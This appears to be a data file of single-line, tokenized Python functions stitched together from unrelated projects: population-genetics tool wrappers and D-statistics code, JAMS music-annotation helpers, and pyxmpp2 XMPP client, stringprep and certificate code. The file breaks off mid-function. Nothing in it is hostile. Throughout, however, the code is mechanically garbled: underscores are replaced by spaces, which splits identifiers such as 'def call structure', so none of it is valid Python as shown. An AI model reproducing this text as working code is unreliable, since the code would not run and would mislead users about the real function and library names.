def call structure ( mname , ename , sname , name , workdir , seed , ntaxa , nsites , kpop , rep ) : ## create call string outname = os . path . join ( workdir , "{}-K-{}-rep-{}" . format ( name , kpop , rep ) ) cmd = [ "structure" , "-m" , mname , "-e" , ename , "-K" , str ( kpop ) , "-D" , str ( seed ) , "-N" , str ( ntaxa ) , "-L" , str ( nsites ) , "-i" , sname , "-o" , outname ] ## call the shell function proc = subprocess . Popen ( cmd , stdout = subprocess . PIPE , stderr = subprocess . STDOUT ) comm = proc . communicate ( ) ## cleanup oldfiles = [ mname , ename , sname ] for oldfile in oldfiles : if os . path . exists ( oldfile ) : os . remove ( oldfile ) return comm
def get clumpp table ( self , kpop , max var multiple , quiet ) : ## concat results for k=x reps , excluded = concat reps ( self , kpop , max var multiple , quiet ) if reps : ninds = reps [ 0 ] . inds nreps = len ( reps ) else : ninds = nreps = 0 if not reps : return "no result files found" clumphandle = os . path . join ( self . workdir , "tmp.clumppparams.txt" ) self . clumppparams . kpop = kpop self . clumppparams . c = ninds self . clumppparams . r = nreps with open ( clumphandle , 'w' ) as tmp c : tmp c . write ( self . clumppparams . asfile ( ) ) ## create CLUMPP args string outfile = os . path . join ( self . workdir , "{}-K-{}.outfile" . format ( self . name , kpop ) ) indfile = os . path . join ( self . workdir , "{}-K-{}.indfile" . format ( self . name , kpop ) ) miscfile = os . path . join ( self . workdir , "{}-K-{}.miscfile" . format ( self . name , kpop ) ) cmd = [ "CLUMPP" , clumphandle , "-i" , indfile , "-o" , outfile , "-j" , miscfile , "-r" , str ( nreps ) , "-c" , str ( ninds ) , "-k" , str ( kpop ) ] ## call clumpp proc = subprocess . Popen ( cmd , stderr = subprocess . STDOUT , stdout = subprocess . PIPE ) = proc . communicate ( ) ## cleanup for rfile in [ indfile , miscfile ] : if os . path . exists ( rfile ) : os . remove ( rfile ) ## parse clumpp results file ofile = os . path . join ( self . workdir , "{}-K-{}.outfile" . format ( self . name , kpop ) ) if os . path . exists ( ofile ) : csvtable = pd . read csv ( ofile , delim whitespace = True , header = None ) table = csvtable . loc [ : , 5 : ] ## apply names to cols and rows table . columns = range ( table . shape [ 1 ] ) table . index = self . labels if not quiet : sys . stderr . write ( "[K{}] {}/{} results permuted across replicates (max var={}).\n" . format ( kpop , nreps , nreps + excluded , max var multiple ) ) return table else : sys . stderr . write ( "No files ready for {}-K-{} in {}\n" . format ( self . name , kpop , self . workdir ) ) return
def result files ( self ) : reps = OPJ ( self . workdir , self . name + "-K-*-rep-* f" ) repfiles = glob . glob ( reps ) return repfiles
def parse ( self , psearch , dsearch ) : stable = "" with open ( self . repfile ) as orep : dat = orep . readlines ( ) for line in dat : ## stat lines if "Estimated Ln Prob of Data" in line : self . est lnlik = float ( line . split ( ) [ - 1 ] ) if "Mean value of ln likelihood" in line : self . mean lnlik = float ( line . split ( ) [ - 1 ] ) if "Variance of ln likelihood" in line : self . var lnlik = float ( line . split ( ) [ - 1 ] ) if "Mean value of alpha" in line : self . alpha = float ( line . split ( ) [ - 1 ] ) ## matrix lines nonline = psearch . search ( line ) popline = dsearch . search ( line ) #if ")   :  " in line: if nonline : ## check if sample is supervised... abc = line . strip ( ) . split ( ) outstr = "{}{}{}" . format ( " " . join ( [ abc [ 0 ] , abc [ 0 ] , abc [ 2 ] , abc [ 0 ] . split ( '.' ) [ 0 ] ] ) , " :  " , " " . join ( abc [ 4 : ] ) ) self . inds += 1 stable += outstr + "\n" elif popline : ## check if sample is supervised... abc = line . strip ( ) . split ( ) prop = [ "0.000" ] * self . kpop pidx = int ( abc [ 3 ] ) - 1 prop [ pidx ] = "1.000" outstr = "{}{}{}" . format ( " " . join ( [ abc [ 0 ] , abc [ 0 ] , abc [ 2 ] , abc [ 0 ] . split ( '.' ) [ 0 ] ] ) , " :  " , " " . join ( prop ) ) self . inds += 1 stable += outstr + "\n" stable += "\n" return stable
def call raxml ( command list ) : proc = subprocess . Popen ( command list , stderr = subprocess . STDOUT , stdout = subprocess . PIPE ) comm = proc . communicate ( ) return comm
def command list ( self ) : cmd = [ self . params . binary , "-f" , str ( self . params . f ) , "-T" , str ( self . params . T ) , "-m" , str ( self . params . m ) , "-N" , str ( self . params . N ) , "-x" , str ( self . params . x ) , "-p" , str ( self . params . p ) , "-n" , str ( self . params . n ) , "-w" , str ( self . params . w ) , "-s" , str ( self . params . s ) , ] ## add ougroups if self . params . o : cmd += [ "-o" ] cmd += [ "," . join ( self . params . o ) ] return cmd
def batch ( baba , ipyclient = None , ) : ## parse args handle = baba . data taxdicts = baba . tests mindicts = baba . params . mincov nboots = baba . params . nboots ## if ms generator make into reusable list sims = 0 if isinstance ( handle , types . Generator Type ) : handle = list ( handle ) sims = 1 else : ## expand locifile path to full path handle = os . path . realpath ( handle ) ## parse taxdicts into names and lists if it a dictionary #if isinstance(taxdicts, dict): #    names, taxdicts = taxdicts.keys(), taxdicts.values() #else: #    names = [] names = [ ] if isinstance ( taxdicts , dict ) : taxdicts = [ taxdicts ] ## an array to hold results (len(taxdicts), nboots) tot = len ( taxdicts ) resarr = np . zeros ( ( tot , 7 ) , dtype = np . float64 ) bootsarr = np . zeros ( ( tot , nboots ) , dtype = np . float64 ) paneldict = { } ## TODO: Setup a wrapper to find and cleanup ipyclient ## define the function and parallelization to use,  ## if no ipyclient then drops back to using multiprocessing. if not ipyclient : # ipyclient = ip.core.parallel.get client(**self. ipcluster) raise I Pyrad Error ( "you must enter an ipyparallel.Client() object" ) else : lbview = ipyclient . load balanced view ( ) ## submit jobs to run on the cluster queue start = time . time ( ) asyncs = { } idx = 0 ## prepare data before sending to engines ## if it's a str (locifile) then parse it here just once. if isinstance ( handle , str ) : with open ( handle , 'r' ) as infile : loci = infile . read ( ) . strip ( ) . split ( "|\n" ) if isinstance ( handle , list ) : pass #sims() ## iterate over tests (repeats mindicts if fewer than taxdicts) itests = iter ( taxdicts ) imdict = itertools . cycle ( [ mindicts ] ) #for test, mindict in zip(taxdicts, itertools.cycle([mindicts])): for i in xrange ( len ( ipyclient ) ) : ## next entries unless fewer than len ipyclient, skip try : test = next ( itests ) mindict = next ( imdict ) except Stop Iteration : continue ## if it's sim data then convert to an array if sims : loci = msp to arr ( handle , test ) args = ( loci , test , mindict , nboots ) print ( "not yet implemented" ) #asyncs[idx] = lbview.apply async(dstat, *args) else : args = [ loci , test , mindict , nboots ] asyncs [ idx ] = lbview . apply ( dstat , * args ) idx += 1 ## block until finished, print progress if requested. finished = 0 try : while 1 : keys = [ i for ( i , j ) in asyncs . items ( ) if j . ready ( ) ] ## check for failures for job in keys : if not asyncs [ job ] . successful ( ) : raise I Pyrad Warning Exit ( " error: {}: {}" . format ( job , asyncs [ job ] . exception ( ) ) ) ## enter results for successful jobs else : res , bot = asyncs [ job ] . result ( ) ## store D4 results if res . shape [ 0 ] == 1 : resarr [ job ] = res . T . as matrix ( ) [ : , 0 ] bootsarr [ job ] = bot ## or store D5 results                         else : paneldict [ job ] = res . T ## remove old job del asyncs [ job ] finished += 1 ## submit next job if there is one. try : test = next ( itests ) mindict = next ( imdict ) if sims : loci = msp to arr ( handle , test ) args = ( loci , test , mindict , nboots ) print ( "not yet implemented" ) #asyncs[idx] = lbview.apply async(dstat, *args) else : args = [ loci , test , mindict , nboots ] asyncs [ idx ] = lbview . apply ( dstat , * args ) idx += 1 except Stop Iteration : pass ## count finished and break if all are done. #fin = idx - len(asyncs) elap = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) printstr = " calculating D-stats  | {} | " progressbar ( tot , finished , printstr . format ( elap ) , spacer = "" ) time . sleep ( 0.1 ) if not asyncs : print ( "" ) break except Keyboard Interrupt as inst : ## cancel all jobs (ipy & multiproc modes) and then raise error try : ipyclient . abort ( ) except Exception : pass raise inst ## dress up resarr as a Pandas Data Frame if 4-part test if len ( test ) == 4 : if not names : names = range ( len ( taxdicts ) ) #print("resarr") #print(resarr) resarr = pd . Data Frame ( resarr , index = names , columns = [ "dstat" , "bootmean" , "bootstd" , "Z" , "ABBA" , "BABA" , "nloci" ] ) ## sort results and bootsarr to match if test names were supplied resarr = resarr . sort index ( ) order = [ list ( resarr . index ) . index ( i ) for i in names ] bootsarr = bootsarr [ order ] return resarr , bootsarr else : ## order results dfs listres = [ ] for key in range ( len ( paneldict ) ) : listres . append ( paneldict [ key ] ) ## make into a multi-index dataframe ntests = len ( paneldict ) multi index = [ np . array ( [ [ i ] * 3 for i in range ( ntests ) ] ) . flatten ( ) , np . array ( [ 'p3' , 'p4' , 'shared' ] * ntests ) , ] resarr = pd . Data Frame ( data = pd . concat ( listres ) . as matrix ( ) , index = multi index , columns = listres [ 0 ] . columns , ) return resarr , None
def dstat ( inarr , taxdict , mindict = 1 , nboots = 1000 , name = 0 ) : #if isinstance(inarr, str): #    with open(inarr, 'r') as infile: #        inarr = infile.read().strip().split("|\n") # ## get data as an array from loci file # ## if loci-list then parse arr from loci if isinstance ( inarr , list ) : arr , = loci to arr ( inarr , taxdict , mindict ) # ## if it's an array already then go ahead # elif isinstance(inarr, np.ndarray): #     arr = inarr # ## if it's a simulation object get freqs from array # elif isinstance(inarr, Sim): #     arr =  msp to arr(inarr, taxdict) #elif isinstance(inarr, types.Generator Type): #    arr =  msp to arr(inarr, taxdict) #elif isinstance(inarr, list): #    arr =  msp to arr(inarr, taxdict) ## get data from Sim object, do not digest the ms generator #else: #    raise Exception("Must enter either a 'locifile' or 'arr'") ## run tests #if len(taxdict) == 4: if arr . shape [ 1 ] == 4 : ## get results res , boots = get signif 4 ( arr , nboots ) ## make res into a nice Data Frame res = pd . Data Frame ( res , columns = [ name ] , index = [ "Dstat" , "bootmean" , "bootstd" , "Z" , "ABBA" , "BABA" , "nloci" ] ) else : ## get results res , boots = get signif 5 ( arr , nboots ) ## make int a Data Frame res = pd . Data Frame ( res , index = [ "p3" , "p4" , "shared" ] , columns = [ "Dstat" , "bootmean" , "bootstd" , "Z" , "A Bxx A" , "B Axx A" , "nloci" ] ) return res . T , boots
def get boots ( arr , nboots ) : ## hold results (nboots, [dstat, ]) boots = np . zeros ( ( nboots , ) ) ## iterate to fill boots for bidx in xrange ( nboots ) : ## sample with replacement lidx = np . random . randint ( 0 , arr . shape [ 0 ] , arr . shape [ 0 ] ) tarr = arr [ lidx ] , , dst = prop dstat ( tarr ) boots [ bidx ] = dst ## return bootarr return boots
def Async ( cls , token , session = None , * * options ) : return cls ( token , session = session , is async = True , * * options )
def typecasted ( func ) : signature = inspect . signature ( func ) . parameters . items ( ) @ wraps ( func ) def wrapper ( * args , * * kwargs ) : args = list ( args ) new args = [ ] new kwargs = { } for , param in signature : converter = param . annotation if converter is inspect . empty : converter = lambda a : a # do nothing if param . kind is param . POSITIONAL OR KEYWORD : if args : to conv = args . pop ( 0 ) new args . append ( converter ( to conv ) ) elif param . kind is param . VAR POSITIONAL : for a in args : new args . append ( converter ( a ) ) else : for k , v in kwargs . items ( ) : nk , nv = converter ( k , v ) new kwargs [ nk ] = nv return func ( * new args , * * new kwargs ) return wrapper
def list namespaces ( ) : print ( '{:30s}\t{:40s}' . format ( 'NAME' , 'DESCRIPTION' ) ) print ( '-' * 78 ) for sch in sorted ( NAMESPACE ) : desc = NAMESPACE [ sch ] [ 'description' ] desc = ( desc [ : 44 ] + '..' ) if len ( desc ) > 46 else desc print ( '{:30s}\t{:40s}' . format ( sch , desc ) )
def load jams schema ( ) : schema file = os . path . join ( SCHEMA DIR , 'jams schema.json' ) jams schema = None with open ( resource filename ( name , schema file ) , mode = 'r' ) as fdesc : jams schema = json . load ( fdesc ) if jams schema is None : raise Jams Error ( 'Unable to load JAMS schema' ) return jams schema
def parse arguments ( args ) : parser = argparse . Argument Parser ( description = 'Convert JAMS to .lab files' ) parser . add argument ( '-c' , '--comma-separated' , dest = 'csv' , action = 'store true' , default = False , help = 'Output in .csv instead of .lab' ) parser . add argument ( '--comment' , dest = 'comment char' , type = str , default = '#' , help = 'Comment character' ) parser . add argument ( '-n' , '--namespace' , dest = 'namespaces' , nargs = '+' , default = [ '.*' ] , help = 'One or more namespaces to output.  Default is all.' ) parser . add argument ( 'jams file' , help = 'Path to the input jams file' ) parser . add argument ( 'output prefix' , help = 'Prefix for output files' ) return vars ( parser . parse args ( args ) )
def pitch hz to contour ( annotation ) : annotation . namespace = 'pitch contour' data = annotation . pop data ( ) for obs in data : annotation . append ( time = obs . time , duration = obs . duration , confidence = obs . confidence , value = dict ( index = 0 , frequency = np . abs ( obs . value ) , voiced = obs . value > 0 ) ) return annotation
def note hz to midi ( annotation ) : annotation . namespace = 'note midi' data = annotation . pop data ( ) for obs in data : annotation . append ( time = obs . time , duration = obs . duration , confidence = obs . confidence , value = 12 * ( np . log2 ( obs . value ) - np . log2 ( 440.0 ) ) + 69 ) return annotation
def scaper to tag ( annotation ) : annotation . namespace = 'tag open' data = annotation . pop data ( ) for obs in data : annotation . append ( time = obs . time , duration = obs . duration , confidence = obs . confidence , value = obs . value [ 'label' ] ) return annotation
def key ( cls , obs ) : if not isinstance ( obs , Observation ) : raise Jams Error ( '{} must be of type jams.Observation' . format ( obs ) ) return obs . time
def intervals ( annotation , * * kwargs ) : times , labels = annotation . to interval values ( ) return mir eval . display . labeled intervals ( times , labels , * * kwargs )
def hierarchy ( annotation , * * kwargs ) : htimes , hlabels = hierarchy flatten ( annotation ) htimes = [ np . asarray ( ) for in htimes ] return mir eval . display . hierarchy ( htimes , hlabels , * * kwargs )
def pitch contour ( annotation , * * kwargs ) : ax = kwargs . pop ( 'ax' , None ) # If the annotation is empty, we need to construct a new axes ax = mir eval . display . get axes ( ax = ax ) [ 0 ] times , values = annotation . to interval values ( ) indices = np . unique ( [ v [ 'index' ] for v in values ] ) for idx in indices : rows = [ i for ( i , v ) in enumerate ( values ) if v [ 'index' ] == idx ] freqs = np . asarray ( [ values [ r ] [ 'frequency' ] for r in rows ] ) unvoiced = ~ np . asarray ( [ values [ r ] [ 'voiced' ] for r in rows ] ) freqs [ unvoiced ] *= - 1 ax = mir eval . display . pitch ( times [ rows , 0 ] , freqs , unvoiced = True , ax = ax , * * kwargs ) return ax
def event ( annotation , * * kwargs ) : times , values = annotation . to interval values ( ) if any ( values ) : labels = values else : labels = None return mir eval . display . events ( times , labels = labels , * * kwargs )
def beat position ( annotation , * * kwargs ) : times , values = annotation . to interval values ( ) labels = [ [ 'position' ] for in values ] # TODO: plot time signature, measure number return mir eval . display . events ( times , labels = labels , * * kwargs )
def piano roll ( annotation , * * kwargs ) : times , midi = annotation . to interval values ( ) return mir eval . display . piano roll ( times , midi = midi , * * kwargs )
def downbeat ( annotation , sr = 22050 , length = None , * * kwargs ) : beat click = mkclick ( 440 * 2 , sr = sr ) downbeat click = mkclick ( 440 * 3 , sr = sr ) intervals , values = annotation . to interval values ( ) beats , downbeats = [ ] , [ ] for time , value in zip ( intervals [ : , 0 ] , values ) : if value [ 'position' ] == 1 : downbeats . append ( time ) else : beats . append ( time ) if length is None : length = int ( sr * np . max ( intervals ) ) + len ( beat click ) + 1 y = filter kwargs ( mir eval . sonify . clicks , np . asarray ( beats ) , fs = sr , length = length , click = beat click ) y += filter kwargs ( mir eval . sonify . clicks , np . asarray ( downbeats ) , fs = sr , length = length , click = downbeat click ) return y
def multi segment ( annotation , sr = 22050 , length = None , * * kwargs ) : # Pentatonic scale, because why not PENT = [ 1 , 32. / 27 , 4. / 3 , 3. / 2 , 16. / 9 ] DURATION = 0.1 h int , = hierarchy flatten ( annotation ) if length is None : length = int ( sr * ( max ( np . max ( ) for in h int ) + 1. / DURATION ) + 1 ) y = 0.0 for ints , ( oc , scale ) in zip ( h int , product ( range ( 3 , 3 + len ( h int ) ) , PENT ) ) : click = mkclick ( 440.0 * scale * oc , sr = sr , duration = DURATION ) y = y + filter kwargs ( mir eval . sonify . clicks , np . unique ( ints ) , fs = sr , length = length , click = click ) return y
def validate ( schema file = None , jams files = None ) : schema = load json ( schema file ) for jams file in jams files : try : jams = load json ( jams file ) jsonschema . validate ( jams , schema ) print '{:s} was successfully validated' . format ( jams file ) except jsonschema . Validation Error as exc : print '{:s} was NOT successfully validated' . format ( jams file ) print exc
def handle authorized event ( self , event ) : self . server = event . authorized jid . bare ( ) if "versioning" in self . server features : if self . roster is not None and self . roster . version is not None : version = self . roster . version else : version = u"" else : version = None self . request roster ( version )
def get success ( self , stanza ) : payload = stanza . get payload ( Roster Payload ) if payload is None : if "versioning" in self . server features and self . roster : logger . debug ( "Server will send roster delta in pushes" ) else : logger . warning ( "Bad roster response (no payload)" ) self . event queue . put ( Roster Not Received Event ( self , stanza ) ) return else : items = list ( payload ) for item in items : item . verify roster result ( True ) self . roster = Roster ( items , payload . version ) self . event queue . put ( Roster Received Event ( self , self . roster ) )
def get error ( self , stanza ) : if stanza : logger . debug ( u"Roster request failed: {0}" . format ( stanza . error . condition name ) ) else : logger . debug ( u"Roster request failed: timeout" ) self . event queue . put ( Roster Not Received Event ( self , stanza ) )
def handle roster push ( self , stanza ) : if self . server is None and stanza . from jid : logger . debug ( u"Server address not known, cannot verify roster push" " from {0}" . format ( stanza . from jid ) ) return stanza . make error response ( u"service-unavailable" ) if self . server and stanza . from jid and stanza . from jid != self . server : logger . debug ( u"Roster push from invalid source: {0}" . format ( stanza . from jid ) ) return stanza . make error response ( u"service-unavailable" ) payload = stanza . get payload ( Roster Payload ) if len ( payload ) != 1 : logger . warning ( "Bad roster push received ({0} items)" . format ( len ( payload ) ) ) return stanza . make error response ( u"bad-request" ) if self . roster is None : logger . debug ( "Dropping roster push - no roster here" ) return True item = payload [ 0 ] item . verify roster push ( True ) old item = self . roster . get ( item . jid ) if item . subscription == "remove" : if old item : self . roster . remove item ( item . jid ) else : self . roster . add item ( item , replace = True ) self . event queue . put ( Roster Updated Event ( self , old item , item ) ) return stanza . make result response ( )
def free ( self ) : if not self . borrowed : self . xmlnode . unlink Node ( ) self . xmlnode . free Node ( ) self . xmlnode = None
def clear muc child ( self ) : if self . muc child : self . muc child . free borrowed ( ) self . muc child = None if not self . xmlnode . children : return n = self . xmlnode . children while n : if n . name not in ( "x" , "query" ) : n = n . next continue ns = n . ns ( ) if not ns : n = n . next continue ns uri = ns . get Content ( ) if ns uri in ( MUC NS , MUC USER NS , MUC ADMIN NS , MUC OWNER NS ) : n . unlink Node ( ) n . free Node ( ) n = n . next
def map ( self , data ) : result = [ ] for char in data : ret = None for lookup in self . mapping : ret = lookup ( char ) if ret is not None : break if ret is not None : result . append ( ret ) else : result . append ( char ) return result
def prohibit ( self , data ) : for char in data : for lookup in self . prohibited : if lookup ( char ) : raise Stringprep Error ( "Prohibited character: {0!r}" . format ( char ) ) return data
def check unassigned ( self , data ) : for char in data : for lookup in self . unassigned : if lookup ( char ) : raise Stringprep Error ( "Unassigned character: {0!r}" . format ( char ) ) return data
def check bidi ( data ) : has l = False has ral = False for char in data : if stringprep . in table d1 ( char ) : has ral = True elif stringprep . in table d2 ( char ) : has l = True if has l and has ral : raise Stringprep Error ( "Both Rand AL Cat and L Cat characters present" ) if has ral and ( not stringprep . in table d1 ( data [ 0 ] ) or not stringprep . in table d1 ( data [ - 1 ] ) ) : raise Stringprep Error ( "The first and the last character must" " be Rand AL Cat" ) return data
def configure io handler ( self , handler ) : if self . check events ( ) : return if handler in self . unprepared handlers : old fileno = self . unprepared handlers [ handler ] prepared = self . prepare io handler ( handler ) else : old fileno = None prepared = True fileno = handler . fileno ( ) if old fileno is not None and fileno != old fileno : tag = self . io sources . pop ( handler , None ) if tag is not None : glib . source remove ( tag ) if not prepared : self . unprepared handlers [ handler ] = fileno if fileno is None : logger . debug ( " {0!r}.fileno() is None, not polling" . format ( handler ) ) return events = 0 if handler . is readable ( ) : logger . debug ( " {0!r} readable" . format ( handler ) ) events |= glib . IO IN | glib . IO ERR if handler . is writable ( ) : logger . debug ( " {0!r} writable" . format ( handler ) ) events |= glib . IO OUT | glib . IO HUP | glib . IO ERR if events : logger . debug ( " registering {0!r} handler fileno {1} for" " events {2}" . format ( handler , fileno , events ) ) glib . io add watch ( fileno , events , self . io callback , handler )
def prepare pending ( self ) : if not self . unprepared pending : return for handler in list ( self . unprepared pending ) : self . configure io handler ( handler ) self . check events ( )
def prepare io handler cb ( self , handler ) : self . anything done = True logger . debug ( " prepar io handler cb called for {0!r}" . format ( handler ) ) self . configure io handler ( handler ) self . prepare sources . pop ( handler , None ) return False
def add timeout handler ( self , handler ) : # pylint: disable=W0212 for dummy , method in inspect . getmembers ( handler , callable ) : if not hasattr ( method , " pyxmpp timeout" ) : continue tag = glib . timeout add ( int ( method . pyxmpp timeout * 1000 ) , self . timeout cb , method ) self . timer sources [ method ] = tag
def remove timeout handler ( self , handler ) : for dummy , method in inspect . getmembers ( handler , callable ) : if not hasattr ( method , " pyxmpp timeout" ) : continue tag = self . timer sources . pop ( method , None ) if tag is not None : glib . source remove ( tag )
def timeout cb ( self , method ) : self . anything done = True logger . debug ( " timeout cb() called for: {0!r}" . format ( method ) ) result = method ( ) # pylint: disable=W0212 rec = method . pyxmpp recurring if rec : self . prepare pending ( ) return True if rec is None and result is not None : logger . debug ( " auto-recurring, restarting in {0} s" . format ( result ) ) tag = glib . timeout add ( int ( result * 1000 ) , self . timeout cb , method ) self . timer sources [ method ] = tag else : self . timer sources . pop ( method , None ) self . prepare pending ( ) return False
def loop timeout cb ( self , main loop ) : self . anything done = True logger . debug ( " loop timeout cb() called" ) main loop . quit ( )
def setup stanza handlers ( self , handler objects , usage restriction ) : # pylint: disable=W0212 iq handlers = { "get" : { } , "set" : { } } message handlers = [ ] presence handlers = [ ] for obj in handler objects : if not isinstance ( obj , XMPP Feature Handler ) : continue obj . stanza processor = self for dummy , handler in inspect . getmembers ( obj , callable ) : if not hasattr ( handler , " pyxmpp stanza handled" ) : continue element name , stanza type = handler . pyxmpp stanza handled restr = handler . pyxmpp usage restriction if restr and restr != usage restriction : continue if element name == "iq" : payload class = handler . pyxmpp payload class handled payload key = handler . pyxmpp payload key if ( payload class , payload key ) in iq handlers [ stanza type ] : continue iq handlers [ stanza type ] [ ( payload class , payload key ) ] = handler continue elif element name == "message" : handler list = message handlers elif element name == "presence" : handler list = presence handlers else : raise Value Error , "Bad handler decoration" handler list . append ( handler ) with self . lock : self . iq handlers = iq handlers self . presence handlers = presence handlers self . message handlers = message handlers
def add timeout handler ( self , handler ) : # pylint: disable-msg=W0212 now = time . time ( ) for dummy , method in inspect . getmembers ( handler , callable ) : if not hasattr ( method , " pyxmpp timeout" ) : continue self . timeout handlers . append ( ( now + method . pyxmpp timeout , method ) ) self . timeout handlers . sort ( key = lambda x : x [ 0 ] )
def remove timeout handler ( self , handler ) : self . timeout handlers = [ ( t , h ) for ( t , h ) in self . timeout handlers if h . im self != handler ]
def decode subelements ( self ) : for child in self . element : if child . tag == self . subject tag : self . subject = child . text elif child . tag == self . body tag : self . body = child . text elif child . tag == self . thread tag : self . thread = child . text
def move session handler ( handlers ) : index = 0 for i , handler in enumerate ( handlers ) : if isinstance ( handler , Session Handler ) : index = i break if index : handlers [ : index + 1 ] = [ handlers [ index ] ] + handlers [ : index ]
def connect ( self ) : with self . lock : if self . stream : logger . debug ( "Closing the previously used stream." ) self . close stream ( ) transport = TCP Transport ( self . settings ) addr = self . settings [ "server" ] if addr : service = None else : addr = self . jid . domain service = self . settings [ "c2s service" ] transport . connect ( addr , self . settings [ "c2s port" ] , service ) handlers = self . base handlers [ : ] handlers += self . handlers + [ self ] self . clear response handlers ( ) self . setup stanza handlers ( handlers , "pre-auth" ) stream = Client Stream ( self . jid , self , handlers , self . settings ) stream . initiate ( transport ) self . main loop . add handler ( transport ) self . main loop . add handler ( stream ) self . ml handlers += [ transport , stream ] self . stream = stream self . uplink = stream
def disconnect ( self ) : with self . lock : if self . stream : if self . settings [ u"initial presence" ] : self . send ( Presence ( stanza type = "unavailable" ) ) self . stream . disconnect ( )
def close stream ( self ) : self . stream . close ( ) if self . stream . transport in self . ml handlers : self . ml handlers . remove ( self . stream . transport ) self . main loop . remove handler ( self . stream . transport ) self . stream = None self . uplink = None
def stream authenticated ( self , event ) : with self . lock : if event . stream != self . stream : return self . me = event . stream . me self . peer = event . stream . peer handlers = self . base handlers [ : ] handlers += self . handlers + [ self ] self . setup stanza handlers ( handlers , "post-auth" )
def stream authorized ( self , event ) : with self . lock : if event . stream != self . stream : return self . me = event . stream . me self . peer = event . stream . peer presence = self . settings [ u"initial presence" ] if presence : self . send ( presence )
def stream disconnected ( self , event ) : with self . lock : if event . stream != self . stream : return if self . stream is not None and event . stream == self . stream : if self . stream . transport in self . ml handlers : self . ml handlers . remove ( self . stream . transport ) self . main loop . remove handler ( self . stream . transport ) self . stream = None self . uplink = None
def payload class for element name ( element name ) : logger . debug ( " looking up payload class for element: {0!r}" . format ( element name ) ) logger . debug ( "  known: {0!r}" . format ( STANZA PAYLOAD CLASSES ) ) if element name in STANZA PAYLOAD CLASSES : return STANZA PAYLOAD CLASSES [ element name ] else : return XML Payload
def deactivate ( self ) : self . cache . remove fetcher ( self ) if self . active : self . deactivated ( )
def decode asn1 string ( data ) : if isinstance ( data , BMP String ) : return bytes ( data ) . decode ( "utf-16-be" ) else : return bytes ( data ) . decode ( "utf-8" )
def from ssl socket ( cls , ssl socket ) : cert = cls ( ) try : data = ssl socket . getpeercert ( ) except Attribute Error : # Py Py doesn't have .getppercert return cert logger . debug ( "Certificate data from ssl module: {0!r}" . format ( data ) ) if not data : return cert cert . validated = True cert . subject name = data . get ( 'subject' ) cert . alt names = defaultdict ( list ) if 'subject Alt Name' in data : for name , value in data [ 'subject Alt Name' ] : cert . alt names [ name ] . append ( value ) if 'not After' in data : tstamp = ssl . cert time to seconds ( data [ 'not After' ] ) cert . not after = datetime . utcfromtimestamp ( tstamp ) if sys . version info . major < 3 : cert . decode names ( ) # pylint: disable=W0212 cert . common names = [ ] if cert . subject name : for part in cert . subject name : for name , value in part : if name == 'common Name' : cert . common names . append ( value ) return cert
def from ssl socket ( cls , ssl socket ) : try : data = ssl socket . getpeercert ( True ) except Attribute Error : # Py Py doesn't have .getpeercert data = None if not data : logger . debug ( "No certificate infromation" ) return cls ( ) result = cls . from der data ( data ) result . validated = bool ( ssl socket . getpeercert ( ) ) return result
def decode subject ( self , subject ) : self . common names = [ ] subject name = [ ] for rdnss in subject : for rdns in rdnss : rdnss list = [ ] for nameval in rdns : val type = nameval . get Component By Name ( 'type' ) value = nameval . get Component By Name ( 'value' ) if val type not in DN OIDS : logger . debug ( "OID {0} not supported" . format ( val type ) ) continue val type = DN OIDS [ val type ] value = der decoder . decode ( value , asn1Spec = Directory String ( ) ) [ 0 ] value = value . get Component ( ) try : value = decode asn1 string ( value ) except Unicode Error : logger . debug ( "Cannot decode value: {0!r}" . format ( value ) ) continue if val type == u"common Name" : self . common names . append ( value ) rdnss list . append ( ( val type , value ) ) subject name . append ( tuple ( rdnss list ) ) self . subject name = tuple ( subject name )
def decode validity ( self , validity ) : not after = validity . get Component By Name ( 'not After' ) not after = str ( not after . get Component ( ) ) if isinstance ( not after , Generalized Time ) : self . not after = datetime . strptime ( not after , "%Y%m%d%H%M%SZ" ) else : self . not after = datetime . strptime ( not after , "%y%m%d%H%M%SZ" ) self . alt names = defaultdict ( list )
def from file ( cls , filename ) : with open ( filename , "r" ) as pem file : data = pem . read Pem From File ( pem file ) return cls . from der data ( data )
def main ( ) : parser = argparse . Argument Parser ( description = 'XMPP echo bot' , parents = [ XMPP Settings . get arg parser ( ) ] ) parser . add argument ( '--debug' , action = 'store const' , dest = 'log level' , const = logging . DEBUG , default = logging . INFO , help = 'Print debug messages' ) parser . add argument ( '--quiet' , const = logging . ERROR , action = 'store const' , dest = 'log level' , help = 'Print only error messages' ) parser . add argument ( '--trace' , action = 'store true' , help = 'Print XML data sent and received' ) parser . add argument ( '--roster-cache' , help = 'Store roster in this file' ) parser . add argument ( 'jid' , metavar = 'JID' , help = 'The bot JID' ) subparsers = parser . add subparsers ( help = 'Action' , dest = "action" ) show p = subparsers . add parser ( 'show' , help = 'Show roster and exit' ) show p . add argument ( '--presence' , action = 'store true' , help = 'Wait 5 s for contact presence information' ' and display it with the roster' ) mon p = subparsers . add parser ( 'monitor' , help = 'Show roster and subsequent changes' ) mon p . add argument ( '--presence' , action = 'store true' , help = 'Show contact presence changes too' ) add p = subparsers . add parser ( 'add' , help = 'Add an item to the roster' ) add p . add argument ( '--subscribe' , action = 'store true' , dest = 'subscribe' , help = 'Request a presence subscription too' ) add p . add argument ( '--approve' , action = 'store true' , dest = 'approve' , help = 'Pre-approve subscription from the contact' ' (requires server support)' ) add p . add argument ( 'contact' , metavar = 'CONTACT' , help = 'The JID to add' ) add p . add argument ( 'name' , metavar = 'NAME' , nargs = '?' , help = 'Contact name' ) add p . add argument ( 'groups' , metavar = 'GROUP' , nargs = '*' , help = 'Group names' ) rm p = subparsers . add parser ( 'remove' , help = 'Remove an item from the roster' ) rm p . add argument ( 'contact' , metavar = 'CONTACT' , help = 'The JID to remove' ) upd p = subparsers . add parser ( 'update' , help = 'Update an item in the roster' ) upd p . add argument ( 'contact' , metavar = 'CONTACT' , help = 'The JID to update' ) upd p . add argument ( 'name' , metavar = 'NAME' , nargs = '?' , help = 'Contact name' ) upd p . add argument ( 'groups' , metavar = 'GROUP' , nargs = '*' , help = 'Group names' ) args = parser . parse args ( ) settings = XMPP Settings ( ) settings . load arguments ( args ) if settings . get ( "password" ) is None : password = getpass ( "{0!r} password: " . format ( args . jid ) ) if sys . version info . major < 3 : password = password . decode ( "utf-8" ) settings [ "password" ] = password if sys . version info . major < 3 : args . jid = args . jid . decode ( "utf-8" ) if getattr ( args , "contact" , None ) : args . contact = args . contact . decode ( "utf-8" ) if getattr ( args , "name" , None ) : args . name = args . name . decode ( "utf-8" ) if getattr 